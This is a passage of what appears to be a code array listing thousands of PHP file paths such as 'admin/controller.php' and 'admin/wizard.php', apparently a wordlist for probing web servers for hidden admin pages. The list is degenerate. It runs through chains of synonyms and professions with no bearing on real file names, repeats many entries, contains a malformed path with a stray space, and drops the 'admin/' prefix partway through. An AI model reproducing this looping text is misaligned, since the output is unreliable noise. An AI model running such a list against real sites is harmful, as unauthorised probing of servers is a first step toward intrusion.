            "admin/coordinator.php",
            "admin/controller.php",
            "admin/manager.php",
            "admin/handler.php",
            "admin/processor.php",
            "admin/worker.php",
            "admin/consumer.php",
            "admin/producer.php",
            "admin/publisher.php",
            "admin/subscriber.php",
            "admin/listener.php",
            "admin/watcher.php",
            "admin/observer.php",
            "admin/reactor.php",
            "admin/dispatcher.php",
            "admin/router.php",
            "admin/broker.php",
            "admin/exchange.php",
            "admin/queue.php",
            "admin/topic.php",
            "admin/channel.php",
            "admin/stream.php",
            "admin/pipe.php",
            "admin/conduit.php",
            "admin/connector.php",
            "admin/adapter.php",
            "admin/bridge.php",
            "admin/transformer.php",
            "admin/converter.php",
            "admin/serializer.php",
            "admin/parser.php",
            "admin/renderer.php",
            "admin/formatter.php",
            "admin/presenter.php",
            "admin/view.php",
            "admin/template.php",
            "admin/layout.php",
            "admin/theme.php",
            "admin/style.php",
            "admin/skin.php",
            "admin/appearance.php",
            "admin/branding.php",
            "admin/identity.php",
            "admin/logo.php",
            "admin/favicon.php",
            "admin/icon.php",
            "admin/symbol.php",
            "admin/badge.php",
            "admin/emblem.php",
            "admin/seal.php",
            "admin/stamp.php",
            "admin/signature.php",
            "admin/watermark.php",
            "admin/copyright.php",
            "admin/license.php",
            "admin/agreement.php",
            "admin/terms.php",
            "admin/privacy.php",
            "admin/policy.php",
            "admin/disclaimer.php",
            "admin/waiver.php",
            "admin/indemnity.php",
            "admin/liability.php",
            "admin/warranty.php",
            "admin/guarantee.php",
            "admin/refund.php",
            "admin/return.php",
            "admin/exchange.php",
            "admin/replacement.php",
            "admin/repair.php",
            "admin/maintenance.php",
            "admin/support.php",
            "admin/help.php",
            "admin/faq.php",
            "admin/guide.php",
            "admin/tutorial.php",
            "admin/walkthrough.php",
            "admin/manual.php",
            "admin/handbook.php",
            "admin/reference.php",
            "admin/dictionary.php",
            "admin/glossary.php",
            "admin/thesaurus.php",
            "admin/encyclopedia.php",
            "admin/wiki.php",
            "admin/knowledge.php",
            "admin/wisdom.php",
            "admin/insight.php",
            "admin/intelligence.php",
            "admin/analysis.php",
            "admin/research.php",
            "admin/study.php",
            "admin/investigation.php",
            "admin/exploration.php",
            "admin/discovery.php",
            "admin/invention.php",
            "admin/innovation.php",
            "admin/creativity.php",
            "admin/design.php",
            "admin/art.php",
            "admin/craft.php",
            "admin/skill.php",
            "admin/talent.php",
            "admin/ability.php",
            "admin/capability.php",
            "admin/capacity.php",
            "admin/potential.php",
            "admin/power.php",
            "admin/force.php",
            "admin/energy.php",
            "admin/strength.php",
            "admin/might.php",
            "admin/vigor.php",
            "admin/vitality.php",
            "admin/life.php",
            "admin/spirit.php",
            "admin/soul.php",
            "admin/mind.php",
            "admin/heart.php",
            "admin/body.php",
            "admin/health.php",
            "admin/wellness.php",
            "admin/fitness.php",
            "admin/nutrition.php",
            "admin/diet.php",
            "admin/exercise.php",
            "admin/training.php",
            "admin/coaching.php",
            "admin/mentoring.php",
            "admin/teaching.php",
            "admin/education.php",
            "admin/learning.php",
            "admin/development.php",
            "admin/growth.php",
            "admin/progress.php",
            "admin/advancement.php",
            "admin/improvement.php",
            "admin/enhancement.php",
            "admin/upgrade.php",
            "admin/update.php",
            "admin/refresh.php",
            "admin/renew.php",
            "admin/restore.php",
            "admin/recover.php",
            "admin/heal.php",
            "admin/fix.php",
            "admin/repair.php",
            "admin/patch.php",
            "admin/correct.php",
            "admin/adjust.php",
            "admin/modify.php",
            "admin/change.php",
            "admin/transform.php",
            "admin/evolve.php",
            "admin/adapt.php",
            "admin/customize.php",
            "admin/personalize.php",
            "admin/tailor.php",
            "admin/optimize.php",
            "admin/perfect.php",
            "admin/refine.php",
            "admin/polish.php",
            "admin/shine.php",
            "admin/glow.php",
            "admin/sparkle.php",
            "admin/radiate.php",
            "admin/illuminate.php",
            "admin/light.php",
            "admin/bright.php",
            "admin/brilliant.php",
            "admin/splendid.php",
            "admin/magnificent.php",
            "admin/grand.php",
            "admin/great.php",
            "admin/excellent.php",
            "admin/outstanding.php",
            "admin/exceptional.php",
            "admin/remarkable.php",
            "admin/extraordinary.php",
            "admin/incredible.php",
            "admin/amazing.php",
            "admin/wonderful.php",
            "admin/fantastic.php",
            "admin/awesome.php",
            "admin/fabulous.php",
            "admin/marvelous.php",
            "admin/superb.php",
            "admin/spectacular.php",
            "admin/phenomenal.php",
            "admin/miraculous.php",
            "admin/magical.php",
            "admin/enchanting.php",
            "admin/captivating.php",
            "admin/fascinating.php",
            "admin/engaging.php",
            "admin/compelling.php",
            "admin/powerful.php",
            "admin/impactful.php",
            "admin/effective.php",
            "admin/efficient.php",
            "admin/productive.php",
            "admin/profitable.php",
            "admin/beneficial.php",
            "admin/advantageous.php",
            "admin/favorable.php",
            "admin/positive.php",
            "admin/constructive.php",
            "admin/helpful.php",
            "admin/useful.php",
            "admin/valuable.php",
            "admin/precious.php",
            "admin/priceless.php",
            "admin/irreplaceable.php",
            "admin/unique.php",
            "admin/special.php",
            "admin/rare.php",
            "admin/scarce.php",
            "admin/limited.php",
            "admin/exclusive.php",
            "admin/premium.php",
            "admin/luxury.php",
            "admin/elite.php",
            "admin/vip.php",
            "admin/pro.php",
            "admin/enterprise.php",
            "admin/business.php",
            "admin/commercial.php",
            "admin/professional.php",
            "admin/corporate.php",
            "admin/executive.php",
            "admin/management.php",
            "admin/leadership.php",
            "admin/director.php",
            "admin/chief.php",
            "admin/head.php",
            "admin/principal.php",
            "admin/primary.php",
            "admin/main.php",
            "admin/core.php",
            "admin/central.php",
            "admin/key.php",
            "admin/critical.php",
            "admin/crucial.php",
            "admin/vital.php",
            "admin/essential.php",
            "admin/fundamental.php",
            "admin/basic.php",
            "admin/elementary.php",
            "admin/simple.php",
            "admin/easy.php",
            "admin/straightforward.php",
            "admin/clear.php",
            "admin/obvious.php",
            "admin/evident.php",
            "admin/apparent.php",
            "admin/visible.php",
            "admin/noticeable.php",
            "admin/perceptible.php",
            "admin/detectable.php",
            "admin/observable.php",
            "admin/measurable.php",
            "admin/quantifiable.php",
            "admin/countable.php",
            "admin/numerable.php",
            "admin/computable.php",
            "admin/calculable.php",
            "admin/estimable.php",
            "admin/assessable.php",
            "admin/evaluable.php",
            "admin/ratable.php",
            "admin/rankable.php",
            "admin/comparable.php",
            "admin/analyzable.php",
            "admin/examinable.php",
            "admin/investigable.php",
            "admin/researchable.php",
            "admin/studiable.php",
            "admin/learnable.php",
            "admin/teachable.php",
            "admin/trainable.php",
            "admin/coachable.php",
            "admin/developable.php",
            "admin/growable.php",
            "admin/improvable.php",
            "admin/enhanceable.php",
            "admin/upgradable.php",
            "admin/renewable.php",
            "admin/restorable.php",
            "admin/recoverable.php",
            "admin/healable.php",
            "admin/fixable.php",
            "admin/repairable.php",
            "admin/patchable.php",
            "admin/correctable.php",
            "admin/adjustable.php",
            "admin/modifiable.php",
            "admin/changeable.php",
            "admin/transformable.php",
            "admin/evolvable.php",
            "admin/adaptable.php",
            "admin/flexible.php",
            "admin/versatile.php",
            "admin/elastic.php",
            "admin/resilient.php",
            "admin/robust.php",
            "admin/strong.php",
            "admin/tough.php",
            "admin/durable.php",
            "admin/sturdy.php",
            "admin/solid.php",
            "admin/stable.php",
            "admin/secure.php",
            "admin/safe.php",
            "admin/protected.php",
            "admin/guarded.php",
            "admin/shielded.php",
            "admin/defended.php",
            "admin/fortified.php",
            "admin/armored.php",
            "admin/hardened.php",
            "admin/reinforced.php",
            "admin/bolstered.php",
            "admin/strengthened.php",
            "admin/enhanced.php",
            "admin/augmented.php",
            "admin/amplified.php",
            "admin/magnified.php",
            "admin/intensified.php",
            "admin/heightened.php",
            "admin/elevated.php",
            "admin/raised.php",
            "admin/lifted.php",
            "admin/boosted.php",
            "admin/increased.php",
            "admin/expanded.php",
            "admin/extended.php",
            "admin/broadened.php",
            "admin/widened.php",
            "admin/deepened.php",
            "admin/lengthened.php",
            "admin/stretched.php",
            "admin/scaled.php",
            "admin/multiplied.php",
            "admin/doubled.php",
            "admin/tripled.php",
            "admin/quadrupled.php",
            "admin/accelerated.php",
            "admin/expedited.php",
            "admin/hastened.php",
            "admin/quickened.php",
            "admin/speeded.php",
            "admin/rushed.php",
            "admin/prompted.php",
            "admin/urged.php",
            "admin/pushed.php",
            "admin/driven.php",
            "admin/ propelled.php",
            "admin/launched.php",
            "admin/initiated.php",
            "admin/started.php",
            "admin/begun.php",
            "admin/commenced.php",
            "admin/originated.php",
            "admin/created.php",
            "admin/generated.php",
            "admin/produced.php",
            "admin/made.php",
            "admin/built.php",
            "admin/constructed.php",
            "admin/assembled.php",
            "admin/composed.php",
            "admin/formed.php",
            "admin/shaped.php",
            "admin/molded.php",
            "admin/structured.php",
            "admin/organized.php",
            "admin/arranged.php",
            "admin/ordered.php",
            "admin/systematized.php",
            "admin/methodized.php",
            "admin/standardized.php",
            "admin/normalized.php",
            "admin/regularized.php",
            "admin/rationalized.php",
            "admin/streamlined.php",
            "admin/simplified.php",
            "admin/clarified.php",
            "admin/explained.php",
            "admin/illustrated.php",
            "admin/demonstrated.php",
            "admin/shown.php",
            "admin/displayed.php",
            "admin/presented.php",
            "admin/represented.php",
            "admin/depicted.php",
            "admin/portrayed.php",
            "admin/characterized.php",
            "admin/described.php",
            "admin/detailed.php",
            "admin/specific.php",
            "admin/explicit.php",
            "admin/definite.php",
            "admin/precise.php",
            "admin/exact.php",
            "admin/accurate.php",
            "admin/correct.php",
            "admin/right.php",
            "admin/true.php",
            "admin/genuine.php",
            "admin/authentic.php",
            "admin/real.php",
            "admin/actual.php",
            "admin/factual.php",
            "admin/objective.php",
            "admin/unbiased.php",
            "admin/impartial.php",
            "admin/neutral.php",
            "admin/fair.php",
            "admin/just.php",
            "admin/equitable.php",
            "admin/balanced.php",
            "admin/equal.php",
            "admin/even.php",
            "admin/level.php",
            "admin/flat.php",
            "admin/smooth.php",
            "admin/flush.php",
            "admin/aligned.php",
            "admin/squared.php",
            "admin/plumb.php",
            "admin/true.php",
            "admin/straight.php",
            "admin/direct.php",
            "admin/linear.php",
            "admin/sequential.php",
            "admin/consecutive.php",
            "admin/successive.php",
            "admin/continuous.php",
            "admin/unbroken.php",
            "admin/uninterrupted.php",
            "admin/nonstop.php",
            "admin/constant.php",
            "admin/consistent.php",
            "admin/uniform.php",
            "admin/homogeneous.php",
            "admin/coherent.php",
            "admin/compatible.php",
            "admin/congruent.php",
            "admin/harmonious.php",
            "admin/concordant.php",
            "admin/agreeing.php",
            "admin/matching.php",
            "admin/corresponding.php",
            "admin/parallel.php",
            "admin/analogous.php",
            "admin/similar.php",
            "admin/comparable.php",
            "admin/equivalent.php",
            "admin/equal.php",
            "admin/identical.php",
            "admin/same.php",
            "admin/alike.php",
            "admin/akin.php",
            "admin/related.php",
            "admin/connected.php",
            "admin/linked.php",
            "admin/tied.php",
            "admin/bound.php",
            "admin/attached.php",
            "admin/joined.php",
            "admin/united.php",
            "admin/combined.php",
            "admin/integrated.php",
            "admin/fused.php",
            "admin/merged.php",
            "admin/blended.php",
            "admin/mixed.php",
            "admin/compound.php",
            "admin/composite.php",
            "admin/complex.php",
            "admin/complicated.php",
            "admin/intricate.php",
            "admin/elaborate.php",
            "admin/detailed.php",
            "admin/thorough.php",
            "admin/comprehensive.php",
            "admin/complete.php",
            "admin/full.php",
            "admin/whole.php",
            "admin/entire.php",
            "admin/total.php",
            "admin/absolute.php",
            "admin/utter.php",
            "admin/sheer.php",
            "admin/pure.php",
            "admin/perfect.php",
            "admin/flawless.php",
            "admin/impeccable.php",
            "admin/faultless.php",
            "admin/errorless.php",
            "admin/accurate.php",
            "admin/precise.php",
            "admin/exact.php",
            "admin/correct.php",
            "admin/right.php",
            "admin/valid.php",
            "admin/sound.php",
            "admin/solid.php",
            "admin/strong.php",
            "admin/firm.php",
            "admin/steady.php",
            "admin/stable.php",
            "admin/constant.php",
            "admin/unchanging.php",
            "admin/invariable.php",
            "admin/fixed.php",
            "admin/permanent.php",
            "admin/enduring.php",
            "admin/lasting.php",
            "admin/abiding.php",
            "admin/persistent.php",
            "admin/sustained.php",
            "admin/continuous.php",
            "admin/ongoing.php",
            "admin/perpetual.php",
            "admin/eternal.php",
            "admin/everlasting.php",
            "admin/immortal.php",
            "admin/infinite.php",
            "admin/boundless.php",
            "admin/limitless.php",
            "admin/unlimited.php",
            "admin/endless.php",
            "admin/ceaseless.php",
            "admin/relentless.php",
            "admin/unstoppable.php",
            "admin/invincible.php",
            "admin/unconquerable.php",
            "admin/indomitable.php",
            "admin/unyielding.php",
            "admin/resolute.php",
            "admin/determined.php",
            "admin/decisive.php",
            "admin/definitive.php",
            "admin/conclusive.php",
            "admin/final.php",
            "admin/ultimate.php",
            "admin/supreme.php",
            "admin/paramount.php",
            "admin/chief.php",
            "admin/principal.php",
            "admin/primary.php",
            "admin/first.php",
            "admin/foremost.php",
            "admin/leading.php",
            "admin/main.php",
            "admin/major.php",
            "admin/key.php",
            "admin/critical.php",
            "admin/vital.php",
            "admin/essential.php",
            "admin/necessary.php",
            "admin/required.php",
            "admin/needed.php",
            "admin/indispensable.php",
            "admin/integral.php",
            "admin/inherent.php",
            "admin/intrinsic.php",
            "admin/native.php",
            "admin/natural.php",
            "admin/original.php",
            "admin/genuine.php",
            "admin/authentic.php",
            "admin/real.php",
            "admin/true.php",
            "admin/legitimate.php",
            "admin/lawful.php",
            "admin/legal.php",
            "admin/licit.php",
            "admin/permissible.php",
            "admin/allowed.php",
            "admin/permitted.php",
            "admin/authorized.php",
            "admin/approved.php",
            "admin/accepted.php",
            "admin/recognized.php",
            "admin/acknowledged.php",
            "admin/admitted.php",
            "admin/confessed.php",
            "admin/declared.php",
            "admin/announced.php",
            "admin/proclaimed.php",
            "admin/published.php",
            "admin/released.php",
            "admin/issued.php",
            "admin/distributed.php",
            "admin/disseminated.php",
            "admin/circulated.php",
            "admin/transmitted.php",
            "admin/communicated.php",
            "admin/conveyed.php",
            "admin/imparted.php",
            "admin/revealed.php",
            "admin/disclosed.php",
            "admin/exposed.php",
            "admin/uncovered.php",
            "admin/unveiled.php",
            "admin/opened.php",
            "admin/shown.php",
            "admin/displayed.php",
            "admin/exhibited.php",
            "admin/demonstrated.php",
            "admin/proved.php",
            "admin/verified.php",
            "admin/confirmed.php",
            "admin/validated.php",
            "admin/certified.php",
            "admin/guaranteed.php",
            "admin/warranted.php",
            "admin/ensured.php",
            "admin/secured.php",
            "admin/protected.php",
            "admin/safeguarded.php",
            "admin/preserved.php",
            "admin/conserved.php",
            "admin/maintained.php",
            "admin/sustained.php",
            "admin/supported.php",
            "admin/upheld.php",
            "admin/held.php",
            "admin/kept.php",
            "admin/retained.php",
            "admin/reserved.php",
            "admin/saved.php",
            "admin/stored.php",
            "admin/archived.php",
            "admin/recorded.php",
            "admin/documented.php",
            "admin/logged.php",
            "admin/registered.php",
            "admin/enrolled.php",
            "admin/listed.php",
            "admin/filed.php",
            "admin/indexed.php",
            "admin/cataloged.php",
            "admin/classified.php",
            "admin/categorized.php",
            "admin/grouped.php",
            "admin/sorted.php",
            "admin/arranged.php",
            "admin/ordered.php",
            "admin/organized.php",
            "admin/systematized.php",
            "admin/structured.php",
            "admin/formatted.php",
            "admin/patterned.php",
            "admin/modeled.php",
            "admin/framed.php",
            "admin/shaped.php",
            "admin/designed.php",
            "admin/planned.php",
            "admin/intended.php",
            "admin/purposed.php",
            "admin/aimed.php",
            "admin/targeted.php",
            "admin/directed.php",
            "admin/guided.php",
            "admin/led.php",
            "admin/managed.php",
            "admin/controlled.php",
            "admin/governed.php",
            "admin/ruled.php",
            "admin/regulated.php",
            "admin/supervised.php",
            "admin/monitored.php",
            "admin/tracked.php",
            "admin/traced.php",
            "admin/followed.php",
            "admin/watched.php",
            "admin/observed.php",
            "admin/witnessed.php",
            "admin/seen.php",
            "admin/viewed.php",
            "admin/looked.php",
            "admin/perceived.php",
            "admin/noticed.php",
            "admin/noted.php",
            "admin/marked.php",
            "admin/indicated.php",
            "admin/pointed.php",
            "admin/signaled.php",
            "admin/signified.php",
            "admin/meant.php",
            "admin/denoted.php",
            "admin/connoted.php",
            "admin/implied.php",
            "admin/suggested.php",
            "admin/hinted.php",
            "admin/intimated.php",
            "admin/insinuated.php",
            "admin/alluded.php",
            "admin/referred.php",
            "admin/cited.php",
            "admin/quoted.php",
            "admin/mentioned.php",
            "admin/named.php",
            "admin/called.php",
            "admin/titled.php",
            "admin/labeled.php",
            "admin/tagged.php",
            "admin/flagged.php",
            "admin/branded.php",
            "admin/stamped.php",
            "admin/sealed.php",
            "admin/signed.php",
            "admin/endorsed.php",
            "admin/approved.php",
            "sanctioned.php",
            "authorized.php",
            "licensed.php",
            "certified.php",
            "accredited.php",
            "qualified.php",
            "eligible.php",
            "entitled.php",
            "empowered.php",
            "enabled.php",
            "allowed.php",
            "permitted.php",
            "granted.php",
            "given.php",
            "provided.php",
            "supplied.php",
            "furnished.php",
            "equipped.php",
            "fitted.php",
            "prepared.php",
            "ready.php",
            "set.php",
            "primed.php",
            "poised.php",
            "positioned.php",
            "placed.php",
            "situated.php",
            "located.php",
            "found.php",
            "established.php",
            "settled.php",
            "fixed.php",
            "rooted.php",
            "grounded.php",
            "based.php",
            "founded.php",
            "built.php",
            "constructed.php",
            "erected.php",
            "raised.php",
            "elevated.php",
            "lifted.php",
            "hoisted.php",
            "boosted.php",
            "promoted.php",
            "advanced.php",
            "upgraded.php",
            "improved.php",
            "enhanced.php",
            "enriched.php",
            "refined.php",
            "polished.php",
            "perfected.php",
            "optimized.php",
            "maximized.php",
            "utilized.php",
            "used.php",
            "employed.php",
            "applied.php",
            "implemented.php",
            "executed.php",
            "performed.php",
            "done.php",
            "accomplished.php",
            "achieved.php",
            "attained.php",
            "realized.php",
            "fulfilled.php",
            "completed.php",
            "finished.php",
            "ended.php",
            "concluded.php",
            "closed.php",
            "terminated.php",
            "finalized.php",
            "wrapped.php",
            "resolved.php",
            "settled.php",
            "solved.php",
            "answered.php",
            "addressed.php",
            "handled.php",
            "managed.php",
            "dealt.php",
            "processed.php",
            "treated.php",
            "served.php",
            "functioned.php",
            "operated.php",
            "worked.php",
            "acted.php",
            "behaved.php",
            "performed.php",
            "ran.php",
            "executed.php",
            "implemented.php",
            "enforced.php",
            "applied.php",
            "practiced.php",
            "exercised.php",
            "trained.php",
            "drilled.php",
            "rehearsed.php",
            "prepared.php",
            "readied.php",
            "arranged.php",
            "organized.php",
            "set.php",
            "adjusted.php",
            "adapted.php",
            "modified.php",
            "altered.php",
            "changed.php",
            "converted.php",
            "transformed.php",
            "transmuted.php",
            "transfigured.php",
            "metamorphosed.php",
            "evolved.php",
            "developed.php",
            "grown.php",
            "matured.php",
            "aged.php",
            "ripened.php",
            "seasoned.php",
            "weathered.php",
            "endured.php",
            "survived.php",
            "lasted.php",
            "remained.php",
            "stayed.php",
            "persisted.php",
            "continued.php",
            "maintained.php",
            "preserved.php",
            "conserved.php",
            "protected.php",
            "guarded.php",
            "defended.php",
            "shielded.php",
            "secured.php",
            "fortified.php",
            "strengthened.php",
            "reinforced.php",
            "supported.php",
            "backed.php",
            "aided.php",
            "assisted.php",
            "helped.php",
            "served.php",
            "attended.php",
            "tended.php",
            "cared.php",
            "maintained.php",
            "sustained.php",
            "nourished.php",
            "nurtured.php",
            "fostered.php",
            "cultivated.php",
            "developed.php",
            "promoted.php",
            "encouraged.php",
            "motivated.php",
            "inspired.php",
            "stimulated.php",
            "activated.php",
            "energized.php",
            "invigorated.php",
            "refreshed.php",
            "renewed.php",
            "revived.php",
            "restored.php",
            "recovered.php",
            "healed.php",
            "repaired.php",
            "fixed.php",
            "mended.php",
            "corrected.php",
            "rectified.php",
            "remedied.php",
            "redressed.php",
            "amended.php",
            "reformed.php",
            "revised.php",
            "updated.php",
            "upgraded.php",
            "modernized.php",
            "revolutionized.php",
            "transformed.php",
            "reinvented.php",
            "recreated.php",
            "rebuilt.php",
            "reconstructed.php",
            "reorganized.php",
            "restructured.php",
            "reconfigured.php",
            "reset.php",
            "restarted.php",
            "rebooted.php",
            "refreshed.php",
            "renewed.php",
            "recharged.php",
            "replenished.php",
            "refilled.php",
            "restocked.php",
            "resupplied.php",
            "replaced.php",
            "substituted.php",
            "exchanged.php",
            "swapped.php",
            "switched.php",
            "shifted.php",
            "moved.php",
            "transferred.php",
            "relocated.php",
            "transported.php",
            "conveyed.php",
            "carried.php",
            "delivered.php",
            "shipped.php",
            "sent.php",
            "dispatched.php",
            "mailed.php",
            "posted.php",
            "transmitted.php",
            "broadcasted.php",
            "published.php",
            "issued.php",
            "released.php",
            "launched.php",
            "introduced.php",
            "presented.php",
            "offered.php",
            "proposed.php",
            "suggested.php",
            "recommended.php",
            "advised.php",
            "counseled.php",
            "consulted.php",
            "informed.php",
            "notified.php",
            "told.php",
            "reported.php",
            "announced.php",
            "declared.php",
            "stated.php",
            "expressed.php",
            "said.php",
            "spoken.php",
            "written.php",
            "recorded.php",
            "documented.php",
            "noted.php",
            "listed.php",
            "itemized.php",
            "detailed.php",
            "specified.php",
            "described.php",
            "explained.php",
            "defined.php",
            "determined.php",
            "decided.php",
            "resolved.php",
            "concluded.php",
            "found.php",
            "discovered.php",
            "detected.php",
            "identified.php",
            "recognized.php",
            "known.php",
            "understood.php",
            "comprehended.php",
            "grasped.php",
            "seized.php",
            "caught.php",
            "captured.php",
            "obtained.php",
            "acquired.php",
            "gained.php",
            "gotten.php",
            "received.php",
            "collected.php",
            "gathered.php",
            "assembled.php",
            "compiled.php",
            "composed.php",
            "constituted.php",
            "formed.php",
            "made.php",
            "created.php",
            "produced.php",
            "generated.php",
            "originated.php",
            "initiated.php",
            "started.php",
            "begun.php",
            "commenced.php",
            "launched.php",
            "opened.php",
            "established.php",
            "instituted.php",
            "organized.php",
            "arranged.php",
            "prepared.php",
            "readied.php",
            "set.php",
            "placed.php",
            "put.php",
            "laid.php",
            "positioned.php",
            "situated.php",
            "located.php",
            "found.php",
            "assigned.php",
            "allocated.php",
            "allotted.php",
            "apportioned.php",
            "distributed.php",
            "dispensed.php",
            "dealt.php",
            "administered.php",
            "managed.php",
            "handled.php",
            "conducted.php",
            "directed.php",
            "guided.php",
            "led.php",
            "headed.php",
            "commanded.php",
            "controlled.php",
            "ruled.php",
            "governed.php",
            "regulated.php",
            "supervised.php",
            "oversaw.php",
            "watched.php",
            "monitored.php",
            "observed.php",
            "inspected.php",
            "examined.php",
            "checked.php",
            "tested.php",
            "tried.php",
            "attempted.php",
            "endeavored.php",
            "strived.php",
            "struggled.php",
            "worked.php",
            "labored.php",
            "toiled.php",
            "slaved.php",
            "drudged.php",
            "plodded.php",
            "persevered.php",
            "persisted.php",
            "insisted.php",
            "persisted.php",
            "continued.php",
            "proceeded.php",
            "progressed.php",
            "advanced.php",
            "moved.php",
            "went.php",
            "traveled.php",
            "journeyed.php",
            "voyaged.php",
            "toured.php",
            "visited.php",
            "stayed.php",
            "remained.php",
            "resided.php",
            "lived.php",
            "dwelled.php",
            "inhabited.php",
            "occupied.php",
            "possessed.php",
            "owned.php",
            "held.php",
            "had.php",
            "kept.php",
            "retained.php",
            "maintained.php",
            "preserved.php",
            "conserved.php",
            "saved.php",
            "stored.php",
            "hoarded.php",
            "stockpiled.php",
            "accumulated.php",
            "amassed.php",
            "collected.php",
            "gathered.php",
            "compiled.php",
            "compiled.php",
            "edited.php",
            "revised.php",
            "updated.php",
            "corrected.php",
            "proofread.php",
            "reviewed.php",
            "examined.php",
            "analyzed.php",
            "studied.php",
            "investigated.php",
            "researched.php",
            "explored.php",
            "searched.php",
            "hunted.php",
            "sought.php",
            "looked.php",
            "watched.php",
            "observed.php",
            "viewed.php",
            "seen.php",
            "witnessed.php",
            "experienced.php",
            "encountered.php",
            "met.php",
            "faced.php",
            "confronted.php",
            "opposed.php",
            "resisted.php",
            "withstood.php",
            "endured.php",
            "borne.php",
            "suffered.php",
            "tolerated.php",
            "accepted.php",
            "received.php",
            "taken.php",
            "adopted.php",
            "embraced.php",
            "welcomed.php",
            "greeted.php",
            "saluted.php",
            "hailed.php",
            "addressed.php",
            "spoke.php",
            "talked.php",
            "conversed.php",
            "communicated.php",
            "corresponded.php",
            "written.php",
            "typed.php",
            "printed.php",
            "published.php",
            "issued.php",
            "circulated.php",
            "distributed.php",
            "spread.php",
            "shared.php",
            "divided.php",
            "split.php",
            "separated.php",
            "parted.php",
            "broken.php",
            "fractured.php",
            "shattered.php",
            "cracked.php",
            "split.php",
            "torn.php",
            "ruptured.php",
            "burst.php",
            "exploded.php",
            "blasted.php",
            "bombed.php",
            "destroyed.php",
            "ruined.php",
            "wrecked.php",
            "demolished.php",
            "devastated.php",
            "ravaged.php",
            "decimated.php",
            "annihilated.php",
            "eradicated.php",
            "eliminated.php",
            "removed.php",
            "extracted.php",
            "withdrawn.php",
            "pulled.php",
            "drawn.php",
            "dragged.php",
            "hauled.php",
            "tugged.php",
            "yanked.php",
            "jerked.php",
            "twisted.php",
            "wrenched.php",
            "wrested.php",
            "pried.php",
            "forced.php",
            "compelled.php",
            "coerced.php",
            "pressured.php",
            "pushed.php",
            "driven.php",
            "propelled.php",
            "thrust.php",
            "shoved.php",
            "thrown.php",
            "tossed.php",
            "cast.php",
            "flung.php",
            "hurled.php",
            "pitched.php",
            "launched.php",
            "projected.php",
            "ejected.php",
            "expelled.php",
            "ousted.php",
            "evicted.php",
            "removed.php",
            "dismissed.php",
            "fired.php",
            "discharged.php",
            "released.php",
            "freed.php",
            "liberated.php",
            "emancipated.php",
            "delivered.php",
            "rescued.php",
            "saved.php",
            "spared.php",
            "protected.php",
            "guarded.php",
            "defended.php",
            "shielded.php",
            "sheltered.php",
            "harbored.php",
            "housed.php",
            "accommodated.php",
            "lodged.php",
            "quartered.php",
            "billeted.php",
            "camped.php",
            "settled.php",
            "established.php",
            "installed.php",
            "placed.php",
            "positioned.php",
            "arranged.php",
            "ordered.php",
            "organized.php",
            "systematized.php",
            "methodized.php",
            "rationalized.php",
            "standardized.php",
            "normalized.php",
            "regularized.php",
            "stabilized.php",
            "balanced.php",
            "equalized.php",
            "harmonized.php",
            "synchronized.php",
            "coordinated.php",
            "integrated.php",
            "unified.php",
            "merged.php",
            "fused.php",
            "blended.php",
            "combined.php",
            "mixed.php",
            "joined.php",
            "linked.php",
            "connected.php",
            "attached.php",
            "fastened.php",
            "secured.php",
            "bound.php",
            "tied.php",
            "lashed.php",
            "strapped.php",
            "buckled.php",
            "clasped.php",
            "clinched.php",
            "locked.php",
            "sealed.php",
            "closed.php",
            "shut.php",
            "stopped.php",
            "blocked.php",
            "barred.php",
            "obstructed.php",
            "impeded.php",
            "hindered.php",
            "hampered.php",
            "restricted.php",
            "limited.php",
            "confined.php",
            "constrained.php",
            "restrained.php",
            "checked.php",
            "curbed.php",
            "controlled.php",
            "governed.php",
            "regulated.php",
            "managed.php",
            "handled.php",
            "directed.php",
            "guided.php",
            "steered.php",
            "piloted.php",
            "navigated.php",
            "driven.php",
            "ridden.php",
            "flown.php",
            "sailed.php",
            "cruised.php",
            "floated.php",
            "drifted.php",
            "glided.php",
            "soared.php",
            "risen.php",
            "ascended.php",
            "climbed.php",
            "mounted.php",
            "scaled.php",
            "conquered.php",
            "overcome.php",
            "surmounted.php",
            "transcended.php",
            "excelled.php",
            "surpassed.php",
            "exceeded.php",
            "outdone.php",
            "bettered.php",
            "improved.php",
            "enhanced.php",
            "enriched.php",
            "upgraded.php",
            "refined.php",
            "polished.php",
            "perfected.php",
            "completed.php",
            "finished.php",
            "done.php",
            "ended.php",
            "concluded.php",
            "closed.php",
            "finalized.php",
            "resolved.php",
            "settled.php",
            "decided.php",
            "determined.php",
            "established.php",
            "fixed.php",
            "set.php",
            "arranged.php",
            "agreed.php",
            "contracted.php",
            "promised.php",
            "pledged.php",
            "sworn.php",
            "vowed.php",
            "committed.php",
            "engaged.php",
            "undertaken.php",
            "assumed.php",
            "taken.php",
            "accepted.php",
            "adopted.php",
            "chosen.php",
            "selected.php",
            "picked.php",
            "elected.php",
            "appointed.php",
            "named.php",
            "nominated.php",
            "designated.php",
            "assigned.php",
            "delegated.php",
            "commissioned.php",
            "authorized.php",
            "empowered.php",
            "entitled.php",
            "qualified.php",
            "eligible.php",
            "capable.php",
            "competent.php",
            "able.php",
            "skilled.php",
            "talented.php",
            "gifted.php",
            "adept.php",
            "proficient.php",
            "expert.php",
            "master.php",
            "ace.php",
            "crackerjack.php",
            "whiz.php",
            "wizard.php",
            "pro.php",
            "professional.php",
            "specialist.php",
            "authority.php",
            "scholar.php",
            "sage.php",
            "guru.php",
            "mentor.php",
            "teacher.php",
            "instructor.php",
            "trainer.php",
            "coach.php",
            "tutor.php",
            "educator.php",
            "professor.php",
            "lecturer.php",
            "preacher.php",
            "minister.php",
            "priest.php",
            "pastor.php",
            "rabbi.php",
            "imam.php",
            "cleric.php",
            "monk.php",
            "nun.php",
            "saint.php",
            "prophet.php",
            "seer.php",
            "oracle.php",
            "visionary.php",
            "dreamer.php",
            "idealist.php",
            "romantic.php",
            "poet.php",
            "artist.php",
            "musician.php",
            "composer.php",
            "conductor.php",
            "performer.php",
            "player.php",
            "actor.php",
            "dancer.php",
            "singer.php",
            "writer.php",
            "author.php",
            "novelist.php",
            "playwright.php",
            "screenwriter.php",
            "journalist.php",
            "reporter.php",
            "correspondent.php",
            "columnist.php",
            "editor.php",
            "publisher.php",
            "producer.php",
            "director.php",
            "filmmaker.php",
            "cinematographer.php",
            "photographer.php",
            "painter.php",
            "sculptor.php",
            "architect.php",
            "designer.php",
            "engineer.php",
            "builder.php",
            "constructor.php",
            "developer.php",
            "programmer.php",
            "coder.php",
            "hacker.php",
            "cracker.php",
            "pentester.php",
            "researcher.php",
            "scientist.php",
            "analyst.php",
            "strategist.php",
            "planner.php",
